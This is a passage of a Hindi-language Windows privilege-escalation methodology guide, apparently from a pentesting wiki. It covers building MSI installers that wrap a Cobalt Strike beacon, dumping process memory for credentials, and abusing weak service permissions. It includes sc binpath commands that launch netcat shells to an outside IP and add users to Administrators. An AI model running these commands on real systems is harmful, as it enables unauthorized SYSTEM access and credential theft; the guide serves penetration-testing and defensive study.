इस tool का उपयोग करके MSI wrapper बनाने का तरीका जानने के लिए यह tutorial पढ़ें। ध्यान दें कि अगर आप केवल **command lines** **execute** करना चाहते हैं, तो आप "**.bat**" file को wrap कर सकते हैं।

{{#ref}}
msi-wrapper.md
{{#endref}}

### WIX के साथ MSI बनाना


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Visual Studio के साथ MSI बनाना

- Cobalt Strike या Metasploit से `C:\privesc\beacon.exe` में एक **नया Windows EXE TCP payload** **बनाएँ**।
- **Visual Studio** खोलें, **Create a new project** चुनें और search box में "installer" टाइप करें। **Setup Wizard** project चुनें और **Next** पर क्लिक करें।
- project को एक नाम दें, जैसे **AlwaysPrivesc**; location के लिए **`C:\privesc`** इस्तेमाल करें; **place solution and project in the same directory** चुनें और **Create** पर क्लिक करें।
- **Next** पर क्लिक करते रहें, जब तक आप step 3 of 4 (include करने के लिए files चुनें) तक न पहुँच जाएँ। **Add** पर क्लिक करें और अभी-अभी बनाया गया Beacon payload चुनें। फिर **Finish** पर क्लिक करें।
- **Solution Explorer** में **AlwaysPrivesc** project को highlight करें और **Properties** में **TargetPlatform** को **x86** से **x64** में बदलें।
  - आप दूसरी properties भी बदल सकते हैं, जैसे **Author** और **Manufacturer**, जिससे installed app ज़्यादा वैध दिख सकती है।
- project पर right-click करें और **View > Custom Actions** चुनें।
- **Install** पर right-click करें और **Add Custom Action** चुनें।
- **Application Folder** पर double-click करें, अपनी **beacon.exe** file चुनें और **OK** पर क्लिक करें। इससे यह सुनिश्चित होगा कि installer चलाते ही beacon payload execute हो जाए।
- **Custom Action Properties** में **Run64Bit** को **True** में बदलें।
- अंत में, **build करें**।
  - अगर चेतावनी `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` दिखाई दे, तो सुनिश्चित करें कि आपने platform को x64 पर सेट किया है।

### MSI Installation

malicious `.msi` file को **background** में **install** करने के लिए:

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

इस vulnerability का exploit करने के लिए आप इसका उपयोग कर सकते हैं: _exploit/windows/local/always_install_elevated_

## Antivirus और Detectors

### Audit Settings

ये सेटिंग्स तय करती हैं कि क्या **लॉग** किया जा रहा है, इसलिए आपको इन पर ध्यान देना चाहिए

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding में यह जानना दिलचस्प है कि logs कहाँ भेजे जाते हैं.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** को computers पर, जो domain से जुड़े हैं, **local Administrator passwords के प्रबंधन** के लिए बनाया गया है। यह सुनिश्चित करता है कि हर password **अलग, random और नियमित रूप से अपडेट** हो। ये passwords Active Directory में सुरक्षित रूप से संग्रहीत होते हैं और इन्हें केवल वे users ही access कर सकते हैं जिन्हें ACLs के ज़रिए पर्याप्त permissions दी गई हों। अनुमति होने पर वे local admin passwords देख सकते हैं।

{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

सक्रिय होने पर, **plain-text passwords LSASS** (Local Security Authority Subsystem Service) में संग्रहीत होते हैं।\
[**इस पेज पर WDigest के बारे में अधिक जानकारी**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

**Windows 8.1** से शुरू करते हुए, Microsoft ने Local Security Authority (LSA) के लिए बेहतर सुरक्षा पेश की, ताकि अविश्वसनीय प्रक्रियाओं को **उसकी मेमोरी पढ़ने** या उसमें कोड inject करने से **रोका** जा सके और सिस्टम को और सुरक्षित बनाया जा सके।\
[**LSA Protection के बारे में अधिक जानकारी यहाँ**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** को **Windows 10** में पेश किया गया था। इसका उद्देश्य डिवाइस पर संग्रहीत credentials को pass-the-hash attacks जैसे खतरों से सुरक्षित रखना है। [**Credential Guard के बारे में अधिक जानकारी यहाँ उपलब्ध है।**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Cached Credentials

**Domain credentials** को **Local Security Authority** (LSA) द्वारा प्रमाणित किया जाता है और ऑपरेटिंग सिस्टम के घटक उनका उपयोग करते हैं। जब किसी उपयोगकर्ता के लॉगऑन डेटा को किसी पंजीकृत security package द्वारा प्रमाणित किया जाता है, तो आमतौर पर उस उपयोगकर्ता के लिए domain credentials स्थापित हो जाते हैं।\
[**Cached Credentials के बारे में अधिक जानकारी यहाँ**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## उपयोगकर्ता और समूह

### उपयोगकर्ता और समूहों की सूची बनाएँ

आपको जाँचना चाहिए कि जिन समूहों के आप सदस्य हैं, उनमें से किसी के पास दिलचस्प अनुमतियाँ हैं या नहीं।

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### विशेषाधिकार प्राप्त समूह

यदि आप **किसी विशेषाधिकार प्राप्त समूह के सदस्य हैं, तो आप विशेषाधिकार बढ़ा सकते हैं**। विशेषाधिकार प्राप्त समूहों और विशेषाधिकार बढ़ाने के लिए उनका दुरुपयोग करने के तरीके के बारे में यहाँ जानें:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token में हेरफेर

इस पेज पर **token** क्या है, इसके बारे में **और जानें**: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens)।\
**दिलचस्प tokens** के बारे में जानने और उनका दुरुपयोग करने का तरीका जानने के लिए अगला पेज देखें:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### लॉग इन किए हुए उपयोगकर्ता / Sessions

```bash
qwinsta
klist sessions
```

### होम फ़ोल्डर

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### पासवर्ड नीति

```bash
net accounts
```

### क्लिपबोर्ड की सामग्री प्राप्त करें

```bash
powershell -command "Get-Clipboard"
```

## चल रही प्रक्रियाएँ

### फ़ाइल और फ़ोल्डर की अनुमतियाँ

सबसे पहले, प्रक्रियाओं की सूची बनाते समय **प्रक्रिया की command line में पासवर्ड खोजें**।\
जाँचें कि क्या आप **चल रही किसी binary को overwrite कर सकते हैं**, या संभावित [**DLL Hijacking attacks**](dll-hijacking/index.html) का फायदा उठाने के लिए binary फ़ोल्डर में आपके पास write permissions हैं:

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

हमेशा जाँचें कि [**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md) चल रहे हैं या नहीं; privileges escalate करने के लिए उनका दुरुपयोग किया जा सकता है।

Debugger listener थोड़े समय के लिए चल सकता है, इसलिए एक passive port snapshot में उसका न दिखना यह साबित नहीं करता कि वह कभी expose नहीं हुआ। दिखने वाले किसी भी listener का PID, process owner और उस तक lower-privileged user की पहुँच की क्षमता जाँचें; केवल application name या debug flag से cross-user code execution साबित नहीं होता। Routine enumeration को passive रखें और debugger commands न भेजें।

**process binaries की permissions जाँचना**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**प्रोसेस बाइनरीज़ के फ़ोल्डरों की अनुमतियों की जाँच (**[**DLL Hijacking**](dll-hijacking/index.html)**)****

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Snort dynamic preprocessor directories

Snort 2, configuration में घोषित `dynamicpreprocessor directory` से shared libraries लोड कर सकता है, जिसे `snort.exe -c <config>` से चुना जाता है। अगर कोई scheduled task या service Snort को किसी दूसरे account के तहत चलाती है, तो उस सटीक configuration और घोषित module directory की ACL की जाँच करें। अगर आपका token वहाँ files बना सकता है, तो अगली बार जब वह task या service modules लोड करे, तब उस path की code execution के लिए समीक्षा की जा सकती है। run-as account के प्रभावी privileges, सक्रिय configuration, module compatibility, और किसी भी deny या share restrictions की पुष्टि करें; केवल writable directory होने से privilege escalation साबित नहीं होता। [Snort's dynamic-preprocessor documentation](https://www.snort.org/documents/dpx-readme) runtime module loading के बारे में बताता है।

### writable document root वाली privileged web service

Windows Apache installation में service के executable path और run-as account की तुलना उसके सक्रिय `httpd.conf` में मौजूद `DocumentRoot` से करें। सामान्य XAMPP layout के लिए `C:\xampp\apache\conf\httpd.conf` और उसके configured document root की ACL जाँचें, जो अक्सर `C:\xampp\htdocs` होता है। अगर कम privileges वाला user उस root में files बना सकता है, जबकि Apache `LocalSystem` के रूप में चल रहा है, तो server-side code execution host privilege boundary पार कर सकता है। पुष्टि करें कि service चल रही है, वही सटीक path serve किया जा रहा है, और server-side handler उस file type को process करता है; केवल writable root से सिर्फ file creation साबित होती है। probe लिखे बिना ACL की जाँच करें:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

एक पारंपरिक WAMP इंस्टॉलेशन में, service किसी versioned `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (या 32-bit layout के लिए `C:\wamp\...`) की ओर संकेत कर सकती है। इसकी configuration पास ही `conf\httpd.conf` में और default root `C:\wamp64\www` या `C:\wamp\www` हो सकता है। सटीक service image, उसका run-as identity, प्रभावी `DocumentRoot` (जिसमें `${INSTALL_DIR}` का विस्तार और virtual-host overrides शामिल हैं) और root ACL—इन सभी की एक साथ जाँच करें। WAMP directory में लिख पाने से यह साबित नहीं होता कि Apache `SYSTEM` के रूप में चलता है या जमा की गई file को execute करता है। [Apache बताता है कि Windows service अपनी configuration कैसे चुनती है](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Writable IIS root और application-pool network identity

IIS के लिए, `applicationHost.config` में किसी writable physical directory को **active site/application** से जोड़ें, फिर उसका configured pool और server-side handler पहचानें। Served directory में रखी गई code, pool के रूप में तभी चलती है जब IIS उस file type को process करता हो और route तक पहुँचा जा सके। Writable directory को code execution मानने से पहले, मौजूदा user की प्रभावी create-file access, site की runtime state, handler और per-path overrides जाँचें।

ASP.NET की dynamic compilation जाँच के लिए एक अलग path प्रस्तुत करती है: application की compilation directory के अंतर्गत generated files। Default रूप से यह संबंधित .NET Framework installation के भीतर `Temporary ASP.NET Files` directory होती है, लेकिन application का `<compilation tempDirectory>` इसे बदल सकता है। [Microsoft इसका स्थान और per-application subdirectories बताता है](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) और [जब application pools एक-दूसरे पर भरोसा नहीं करते, तब compilation directories को अलग रखने की सिफारिश करता है](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories)। अगर कम-विशेषाधिकार वाला token किसी **विशिष्ट** application के cache में generated source बदल सकता है, तो पता करें कि क्या वह application उसे अधिक विशेषाधिकार वाली [worker-process identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) के अंतर्गत दोबारा compile करता है। केवल file या directory ACL से code execution साबित नहीं होता: cache को active application, प्रभावी token और ACL, compilation settings, process identity और किसी भी recompile के समय से मिलाकर जाँचें। केवल-पढ़ने योग्य metadata की समीक्षा करें; enumeration के दौरान compilation शुरू न करें या cache files न बदलें।

`ApplicationPoolIdentity` या `NetworkService` के रूप में configured IIS pool, आम तौर पर domain resources तक **host computer account** से authenticate करता है, भले ही उसका local token कम-विशेषाधिकार वाला हो। `LocalSystem` के पास स्थानीय रूप से पहले से ही उच्च विशेषाधिकार होते हैं और यह network पर computer account का भी उपयोग करता है; `LocalService` आम तौर पर anonymous network credentials प्रस्तुत करता है। `SpecificUser` pool इसके बजाय अपना configured account उपयोग करता है। [Microsoft इन identity types के बारे में जानकारी देता है](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) और [application-pool network identity के बारे में भी](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)। छोड़ी गई identity setting, pool defaults से inherit हो सकती है; ये defaults IIS के अलग-अलग generations में भिन्न होते हैं, इसलिए pool name देखकर अनुमान लगाने के बजाय प्रभावी configuration पता करें। अगर code execution ऐसे pool तक पहुँचता है जिसकी network identity computer account है, तो उस **विशिष्ट computer** के directory rights का आकलन करें। [DCSync](../active-directory-methodology/dcsync.md) के लिए domain naming context पर replication rights आवश्यक हैं; केवल machine-account ticket या host role से ये अधिकार साबित नहीं होते। Passive enumeration में किसी file को upload किए, network authentication किए या tickets माँगे बिना configuration और ACLs की जाँच करें।

ऐसे readable ASP.NET handler के लिए जो helper process शुरू करता है, request से प्राप्त किसी भी value को authentication, decryption, validation और command construction के दौरान trace करें। `ProcessStartInfo("cmd", "/c ...")` में decoded token जोड़ने वाला handler, shell metacharacters को command बदलने दे सकता है; [Microsoft बताता है कि `cmd` किन special characters का उपयोग करता है](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd)। यह स्थापित करें कि कोई untrusted caller वास्तव में decoded value को प्रभावित कर सकता है और handler तक पहुँच सकता है; फिर प्रभावी application-pool या impersonated identity और child process की identity पता करें। Source की कोई readable line, localhost listener या token-format की कमजोरी—इनमें से कोई भी अकेले privileged command execution साबित नहीं करती। Passive enumeration के दौरान forged requests भेजे या helper चलाए बिना source और pool configuration की समीक्षा करें।

Windows पर PHP service के लिए, request के नियंत्रण वाला path, [`include` या `require`](https://www.php.net/manual/en/function.include.php) को दिया जाए तो वह worker की identity के अंतर्गत कम-विशेषाधिकार वाले user की writable PHP file को evaluate कर सकता है। पुष्टि करें कि request उस statement तक पहुँच सकती है, resolved path ऐसी file को दर्शाता है जिसे कम-विशेषाधिकार वाला user बदल सकता है और worker पढ़ सकता है, लागू PHP path restrictions include की अनुमति देती हैं, और worker वास्तव में उच्च विशेषाधिकारों के साथ चलता है। Loopback listener या writable file अकेले इस chain को साबित नहीं करते; passive enumeration के दौरान endpoint को invoke किए बिना source, service identity और file ACLs की जाँच करें।

### Memory Password mining

Sysinternals के **procdump** का उपयोग करके आप चल रही process का memory dump बना सकते हैं। FTP जैसी services के **credentials memory में clear text में होते हैं**; memory dump करने और credentials पढ़ने की कोशिश करें।

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### असुरक्षित GUI ऐप्स

**SYSTEM के रूप में चलने वाले एप्लिकेशन किसी उपयोगकर्ता को CMD खोलने या डायरेक्टरी ब्राउज़ करने दे सकते हैं।**

उदाहरण: "Windows Help and Support" (Windows + F1), "command prompt" खोजें, "Click to open Command Prompt" पर क्लिक करें

### विशेषाधिकार प्राप्त project-file import

जो एप्लिकेशन कम-विशेषाधिकार वाले उपयोगकर्ता द्वारा लिखे जा सकने वाले drop directory से projects अपने-आप खोलता है, वह importer के खाते के अंतर्गत input trust boundary पार करता है। **सटीक writable path**, उसे खोलने वाली process या task, उसकी effective identity और parser build की समीक्षा करें। [Ghidra project खोलने/restore करने से जुड़ी एक ऐतिहासिक समस्या](https://github.com/NationalSecurityAgency/ghidra/issues/71) में project metadata में XML external entities की अनुमति थी; Windows पर network entity, importing account से authentication करा सकती थी, यदि [outbound SMB और NTLM policy](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking) इसकी अनुमति दें। यह credentials उजागर होने की संभावना है, तुरंत administrator access नहीं: response को किसी अलग अधिकृत या vulnerable path से उपयोग करना संभव होना चाहिए, और current builds का मूल्यांकन उनकी वास्तविक patch स्थिति के आधार पर करना चाहिए। Passive enumeration के दौरान crafted project न खोलें; import workflow और ACLs की जांच करें।

## Services

Service Control Manager (SCM) object का [`SC_MANAGER_CREATE_SERVICE` right](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights), किसी मौजूदा service के rights से अलग है। इस right के लिए सफल, read-only [`OpenSCManager` access request](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) जांच का संकेत है, इस बात का प्रमाण नहीं कि कोई नई service चल सकती है। [`CreateService` एक handle लौटाता है](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew), जिसमें creation के समय मांगे गए service access rights होते हैं; बाद में service को फिर से खोलने पर अलग access check होता है और यह विफल हो सकता है, भले ही मूल handle का उपयोग किया जा सकता हो। Effective local या remote token, granted handle rights, service account, start policy और executable path की अलग-अलग पुष्टि करें। Passive enumeration के दौरान service न बनाएं और न शुरू करें।

Remote service-install path के लिए, उन SCM rights को target पर ऐसे share के साथ मिलाकर जांचें जिसे **वही network logon** लिख सके, उसके underlying NTFS ACL और ऐसे local executable path के साथ जिसे service account चला सके। यदि असामान्य रूप से व्यापक SCM rights और file-placement path, दोनों मौजूद हों, तो non-admin account इस boundary को पार कर सकता है; administrative share अनिवार्य शर्त नहीं है। केवल share पर write access, या केवल SCM create-service का संकेत, यह साबित नहीं करता कि नई service उच्च identity के अंतर्गत शुरू हो सकती है।

कोई मौजूदा service startup, shutdown या अन्य lifecycle event पर helper executable चला सकती है, भले ही वह helper उसके `ImagePath` में मौजूद न हो। यदि helper का नाम lower-user-writable directory में resolve होता है और service उच्च identity के अंतर्गत चलती है, तो अनुपस्थित helper file को सशर्त रूप से बदलने के उम्मीदवार के रूप में देखा जा सकता है। **वास्तविक service code या documented helper invocation**, resolved executable path और search order, directory creation rights, service identity और उपलब्ध lifecycle trigger की पुष्टि करें। केवल writable service directory या अनुपस्थित file से यह साबित नहीं होता कि service उस file को load करती है; passive review में service को शुरू या बंद नहीं करना चाहिए।

मौजूदा service के लिए, [`SERVICE_START`, `StartService` को arguments देने की अनुमति देता है](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); यह [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) से अलग है। Start access को केवल control right से अधिक मानने से पहले service के code या documented interface की समीक्षा करें। यदि service caller द्वारा चुने गए argument को log या export path के रूप में उपयोग करती है, तो service identity, argument से write तक का सटीक flow, path restrictions और **बनाई गई file** की permissions जांचें। Protected directory में write करना तभी privilege escalation बन सकता है जब कोई अलग privileged consumer या loader उस file को स्वीकार करे; केवल writable log या start right पर्याप्त नहीं है। Passive inventory के दौरान service शुरू न करें और test file न बनाएं।

NSClient++ monitoring agent के लिए, पढ़ी जा सकने वाली `nsclient.ini` एक **configuration review का संकेत** है: इसमें web credentials हो सकते हैं, जबकि `boot.ini` configuration को किसी अन्य स्थान पर redirect कर सकती है। वास्तविक service account, WEB listener और access policy, तथा यह जांचें कि authenticated role settings या scripts बदल सकती है या नहीं। Privileged execution के लिए अतिरिक्त रूप से `CheckExternalScripts` (या कोई अन्य enabled execution path), command register या modify करने का प्रभावी अधिकार और ऐसा trigger आवश्यक है जो इसे service identity के अंतर्गत चलाए। Loopback-only listener भी local user के लिए reachable हो सकता है, लेकिन केवल file path, password या listener से उन rights का प्रमाण नहीं मिलता। Passive enumeration के दौरान secrets दिखाए बिना या web API invoke किए बिना metadata और permissions की समीक्षा करें। देखें [NSClient++ file layout](https://nsclient.org/docs/concepts/file-layout/), [web और script security guidance](https://nsclient.org/docs/setup/securing/), और [external-script configuration](https://nsclient.org/docs/reference/check/CheckExternalScripts/)।

ऐसी service के लिए जिसका `ImagePath` `nssm.exe` है, service का वास्तविक run-as account और उसका `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application` value जांचें: [NSSM child application को वहीं संग्रहीत करता है](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), जबकि `AppDirectory` उसका configured working directory है। Wrapper की permissions को पूरी service boundary मानने से पहले child executable और उसकी parent-directory ACLs जांचें। उस child द्वारा expose किया गया local WCF या SOAP endpoint, समीक्षा का एक अलग संकेत है: पुष्टि करें कि lower-privileged user उस listener तक पहुंच सकता है, सटीक operation उसका input स्वीकार करता है, और service child असुरक्षित operation को उच्च identity के अंतर्गत execute करता है। Service account, endpoint URL या writable path अकेले privilege escalation साबित नहीं करते; passive enumeration के दौरान service operations invoke न करें।

Custom WCF operation के लिए, caller द्वारा नियंत्रित string को किसी भी PowerShell runspace तक trace करें। [`Pipeline.Commands.AddScript` script text जोड़ता है](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), और [`Pipeline.Invoke` pipeline चलाता है](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke)। [`netTcpBinding` और Windows transport credentials](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) client को authenticate करते हैं, लेकिन उस **विशिष्ट** operation को call करने का authorization और runspace की effective identity अलग से जांचनी चाहिए। Higher service identity के अंतर्गत, lower-privileged caller के input से `AddScript` तक जाने वाला path code-execution boundary है; केवल listening port, authenticated client या किसी असंबंधित assembly में unused method इसका प्रमाण नहीं है। Enumeration के दौरान endpoint invoke किए बिना deployed service, contract, authorization और impersonation settings की static समीक्षा करें।

Service Triggers कुछ शर्तें पूरी होने पर Windows को service शुरू करने देते हैं (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh आदि)। SERVICE_START rights न होने पर भी, अक्सर उनके triggers सक्रिय करके privileged services शुरू की जा सकती हैं। Enumeration और activation तकनीकें यहां देखें:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Visual Studio diagnostic collector service

C/C++ tooling वाली Visual Studio installations में `VSStandardCollectorService150` शामिल हो सकती है, जो `LocalSystem` के रूप में चलने के लिए configured diagnostic service है। [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) में service DACL reset को redirect करने के लिए junction और object-manager-link race का उपयोग किया गया था। प्रदर्शित privilege escalation के लिए उपयोग योग्य Visual Studio Setup WMI Provider MSI repair path और उसका `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe` target भी आवश्यक था। यह component जनवरी 2024 में fix किया गया था।

Passive triage के लिए, उस service का account और binary path जांचें, देखें कि Setup WMI compiler path मौजूद है या नहीं, और installed component की patch स्थिति सत्यापित करें। केवल service entry, Visual Studio product version या compiler file से यह साबित नहीं होता कि host vulnerable है। जांच के लिए service शुरू करने या repair चलाने की आवश्यकता नहीं है।

Services की सूची प्राप्त करें:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### अनुमतियाँ

आप किसी service की जानकारी प्राप्त करने के लिए **sc** का उपयोग कर सकते हैं.

```bash
sc qc <service_name>
```

प्रत्येक service के लिए आवश्यक privilege level की जाँच करने हेतु _Sysinternals_ का binary **accesschk** रखना recommended है।

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

यह जांचने की सलाह दी जाती है कि क्या "Authenticated Users" किसी भी service को संशोधित कर सकते हैं:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[आप XP के लिए accesschk.exe यहाँ से डाउनलोड कर सकते हैं](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### सेवा सक्षम करें

यदि आपको यह त्रुटि मिल रही है (उदाहरण के लिए SSDPSRV के साथ):

_सिस्टम त्रुटि 1058 हुई है._\
_सेवा शुरू नहीं की जा सकती, क्योंकि यह अक्षम है या इससे कोई सक्षम डिवाइस संबद्ध नहीं है।_

आप इसे इस तरह सक्षम कर सकते हैं

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**ध्यान रखें कि upnphost सेवा को काम करने के लिए SSDPSRV पर निर्भर रहना पड़ता है (XP SP1 के लिए)**

**इस समस्या का एक अन्य समाधान** यह चलाना है:

```
sc.exe config usosvc start= auto
```

### **Service binary path में बदलाव**

उस स्थिति में जब "Authenticated users" समूह के पास किसी service पर **SERVICE_ALL_ACCESS** हो, तो service की executable binary में बदलाव करना संभव है। **sc** को modify और execute करने के लिए:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### सेवा पुनरारंभ करें

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Privileges को विभिन्न permissions के माध्यम से escalate किया जा सकता है:

- **SERVICE_CHANGE_CONFIG**: Service binary को reconfigure करने की अनुमति देता है।
- **WRITE_DAC**: Permissions को reconfigure करने की अनुमति देता है, जिससे service configurations बदलना संभव होता है।
- **WRITE_OWNER**: Ownership हासिल करने और permissions reconfigure करने की अनुमति देता है।
- **GENERIC_WRITE**: Service configurations बदलने की क्षमता भी देता है।
- **GENERIC_ALL**: यह भी service configurations बदलने की क्षमता देता है।

इस vulnerability का पता लगाने और इसका exploitation करने के लिए _exploit/windows/local/service_permissions_ का उपयोग किया जा सकता है।

### Services binaries की कमजोर permissions

अगर कोई service **`LocalSystem`**, **`LocalService`**, **`NetworkService`** या किसी privileged domain account के रूप में चलती है, लेकिन **कम privileges वाले users service EXE या उसके parent folder को modify कर सकते हैं**, तो अक्सर **binary को replace करके और service को restart करके** service को hijack किया जा सकता है।

**जाँचें कि क्या आप किसी service द्वारा execute की जाने वाली binary को modify कर सकते हैं**, या क्या उस folder पर आपकी **write permissions** हैं जहाँ binary मौजूद है ([**DLL Hijacking**](dll-hijacking/index.html))**।**\
आप **wmic** (system32 में नहीं) का उपयोग करके service द्वारा execute की जाने वाली हर binary प्राप्त कर सकते हैं और **icacls** का उपयोग करके अपनी permissions जाँच सकते हैं:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

आप **sc** और **icacls** का भी उपयोग कर सकते हैं:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

**`Everyone`**, **`BUILTIN\Users`**, या **`Authenticated Users`** को दिए गए खतरनाक ACLs देखें, खासकर service executable पर या उसे रखने वाली directory पर **`(F)`**, **`(M)`**, या **`(W)`**। दुरुपयोग का एक व्यावहारिक तरीका:<sup>[[27]](#references)</sup>

1. `sc qc <service_name>` से service account और executable path की पुष्टि करें।
2. `icacls <path>` से पुष्टि करें कि binary लिखने योग्य है।
3. service binary को payload या किसी मान्य malicious service binary से बदलें।
4. `sc stop <service_name> && sc start <service_name>` से service restart करें (या reboot / service trigger होने तक प्रतीक्षा करें)।

उपयोगी automated checks:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> यदि service किसी सामान्य user को उसे restart करने की अनुमति नहीं देती, तो जाँचें कि क्या वह boot पर automatically start होती है, उसमें कोई failure action है जो उसे दोबारा launch करता है, या उसे इस्तेमाल करने वाला application अप्रत्यक्ष रूप से trigger कर सकता है।

### Services registry में बदलाव करने की permissions

आपको जाँचना चाहिए कि क्या आप किसी service registry में बदलाव कर सकते हैं।\
आप यह करके किसी service registry पर अपनी **अनुमतियाँ** **जाँच** सकते हैं:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

